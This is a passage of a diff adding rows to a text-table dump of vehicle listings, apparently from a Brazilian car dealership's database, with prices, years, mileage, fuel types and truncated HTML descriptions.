+| 467 | Prata          | 2016 | 34900  | 10    | midias/galerias/15400487681.jpg | <blank> | 4      | 157    | Fiat Palio Attrative 1.0 Flex Completo legalizado baixo - 2016 | 1        | 3        | <p><span style="color:rgb(74, 74, 74); font-family:nunito; font-size:15.6px">Carro de proced\xeancia, leg                                                                                                                                                                                                                                                                                                                                                                                         | <blank>    | Bicombustível  | 1            | 49000         |
+| 474 | verde e preto  | 2019 | 55900  | 26    | midias/galerias/15422136581.jpg | <blank> | 4      | 276    | Sea-Doo Jet ski GTI 130 SE -2019                               | 1        | 1        | <p><span style="color:rgb(74, 74, 74); font-family:nunito; font-size:15.6px">Jet ski de proced\xeancia, m                                                                                                                                                                                                                                                                                                                                                                                         | <blank>    | Gasolina       | 1            | 1             |
+| 479 | Preta          | 2008 | 35900  | 6     | midias/galerias/15439523651.jpg | <blank> | 4      | 69     | HONDA CIVIC SEDAN LXS 1.8 FLEX 16V AUT - 2008                  | 1        | 3        | <p><span style="color:rgb(74, 74, 74); font-family:nunito; font-size:15.6px">Carro de proced\xeancia, com                                                                                                                                                                                                                                                                                                                                                                                         | <blank>    | bicombustível  | 1            | 142000        |
+| 497 | Prata          | 2008 | 19900  | 5     | midias/galerias/15487864181.jpg | <blank> | 4      | 304    | GM - CHEVROLET CORSA SED. MAXX 1.4 8V ECONOFLEX 4P - 2008      | 1        | 3        | <p><span style="color:rgb(74, 74, 74); font-family:nunito; font-size:15.6px">Carro de proced\xeancia, seg                                                                                                                                                                                                                                                                                                                                                                                         | <blank>    | Bicombustível  | 1            | 78000         |
+| 498 | Prata          | 2018 | 65900  | 9     | midias/galerias/15487878221.jpg | <blank> | 4      | 305    | VW - VOLKSWAGEN POLO HIGHLINE 200 TSI 1.0 FLEX 12V AUT. - 2018 | 1        | 2        | <p><span style="color:rgb(74, 74, 74); font-family:nunito; font-size:15.6px">Carro de proced\xeancia, &ua                                                                                                                                                                                                                                                                                                                                                                                         | <blank>    | Bicombustível  | 1            | 24000         |
+| 499 | BRANCA         | 2014 | 45900  | 6     | midias/galerias/15495456291.JPG | <blank> | 4      | 47     | HONDA FIT EX 1.5 FLEX/ 16V 5P AUT. - 2014                      | 1        | 3        | <p><span style="color:rgb(74, 74, 74); font-family:nunito; font-size:15.6px">Honda Fit 1.5 EX Autom\xe1t                                                                                                                                                                                                                                                                                                                                                                                          | <blank>    | Bicombustível  | 1            | 96000         |
+| 502 | PRATA          | 2018 | 65900  | 5     | midias/galerias/15502481701.jpg | <blank> | 5      | 306    | GM - CHEVROLET SPIN LTZ 1.8 8V ECONO.FLEX 5P AUT. - 2018       | 1        | 3        | <p><span style="color:rgb(74, 74, 74); font-family:nunito; font-size:15.6px">Carro de proced\xeancia, &ua                                                                                                                                                                                                                                                                                                                                                                                         | <blank>    | Bicombustível  | 1            | 37000         |
+| 505 | Prata          | 2010 | 23900  | 13    | midias/galerias/15508631461.jpg | <blank> | 4      | 70     | Ford Fiesta Hatch 1.6 Class - 2010                             | 1        | 3        | <p>\xa0</p>\r\n\r\n<div class="OLXad-description mb30px"                                                                                                                                                                                                                                                                                                                                                                                                                                          | <blank>    | Bicombustível  | 1            | 53000         |
+| 506 | BRANCA         | 2018 | 35900  | 9     | midias/galerias/15508638651.jpg | <blank> | 4      | 230    | VW - VOLKSWAGEN GOL TRENDLINE 1.0 T.FLEX 12V 5P - 2018         | 1        | 3        | <p><span style="color:rgb(74, 74, 74); font-family:nunito; font-size:15.6px">Carro de proced\xeancia, &ua                                                                                                                                                                                                                                                                                                                                                                                         | <blank>    | Bicombustível  | 1            | 28000         |
+| 508 | cinza          | 2001 | 17900  | 5     | midias/galerias/15509324811.jpg | <blank> | 4      | 308    | Chevrolet Astra GL 1.8 MPFI Com Apenas 46.000 km 2001          | 1        | 3        | <p><span style="color:rgb(74, 74, 74); font-family:nunito; font-size:15.6px">Carro de proced\xeancia, rar                                                                                                                                                                                                                                                                                                                                                                                         | <blank>    | Gasolina       | 1            | 46000         |
+| 509 | BRANCA         | 2017 | 52900  | 10    | midias/galerias/15515311491.jpg | <blank> | 2      | 280    | FIAT FIORINO FURGÃO WORK. HARD 1.4 FLEX - 2017                 | 1        | 2        | <p><span style="color:rgb(74, 74, 74); font-family:nunito; font-size:15.6px">Carro de proced\xeancia, &ua                                                                                                                                                                                                                                                                                                                                                                                         | <blank>    | Bicombustível  | 1            | 26000         |
+| 511 | BRANCA         | 2014 | 40900  | 9     | midias/galerias/15515316391.jpg | <blank> | 4      | 309    |  VW - VOLKSWAGEN CROSSFOX I MOTION 1.6 MI T. FLEX - 2014       | 1        | 3        | <p><span style="color:rgb(74, 74, 74); font-family:nunito; font-size:15.6px">Carro de proced\xeancia, &ua                                                                                                                                                                                                                                                                                                                                                                                         | <blank>    | Bicombustível  | 1            | 82000         |
+| 513 | Prata          | 2015 | 39900  | 29    | midias/galerias/15515329521.jpg | <blank> | 4      | 310    | CITROEN C3 EXCLUSIVE 1.5 FLEX 8V 5P MEC. - 2015                | 1        | 3        | <p><span style="color:rgb(74, 74, 74); font-family:nunito; font-size:15.6px">Carro de proced\xeancia, &ua                                                                                                                                                                                                                                                                                                                                                                                         | <blank>    | Bicombustível  | 1            | 59000         |
+| 516 | AZUL           | 2014 | 30900  | 10    | midias/galerias/15515358941.jpg | <blank> | 4      | 9      | FIAT PALIO ATTRA./ITALIA 1.4 EVO F.FLEX 8V 5P - 2014           | 1        | 3        | <div class="OLXad-description mb30px" style="box-sizing: border-box; outline: 0px; font-variant-numeric: inherit; font-variant-east-asian: inherit; font-stretch: inherit; font-size: 12px; line-height: inherit; font-family: Nunito; color: rgb(74, 74, 74); margin-top: 0px; margin-right: 0px; margin-left: 0px; padding: 0px; border: 0px; vertical-align: baseline; overflow: hidden; margin-bottom: 30px !important;">\r\n<p>Carro de proced\xeancia, \xfanico dono, com apenas 82.000 km  | <blank>    | Bicombustível  | 1            | 82000         |
++-----+----------------+------+--------+-------+---------------------------------+---------+--------+--------+----------------------------------------------------------------+----------+----------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+------------+----------------+--------------+---------------+
+
